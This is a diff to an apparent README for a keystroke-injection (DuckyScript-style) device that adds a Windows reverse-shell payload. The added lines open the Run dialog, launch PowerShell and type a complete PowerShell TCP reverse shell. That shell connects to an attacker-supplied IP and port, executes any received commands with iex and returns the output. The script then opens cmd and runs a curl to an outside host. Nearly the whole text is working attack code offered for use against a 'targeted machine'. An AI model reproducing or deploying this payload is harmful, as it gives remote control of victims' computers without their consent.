@@ -139,7 +139,25 @@ access to the targeted machine.
   * Windows Payload: [ZTW/Payloads (github.com)](windows-revershell-payload.txt)
     ```bat
     REM --- WINDOWS REVERSE SHELL ---
+    DEFAULT_DELAY 14
+    DELAY 3000
     GUI r
+    DELAY 500
+    STRING powershell
+    DELAY 500
+    ENTER
+    DELAY 1000
+    STRING 'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<MANCHINE IP>',<MANCHINE PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+    DELAY 500
+    ENTER
+    GUI r
+    DELAY 500
+    STRING cmd
+    ENTER
+    DELAY 1000
+    STRING curl parrot.live
+    DELAY 500
+    ENTER
     ```
 
 # Reference Links 
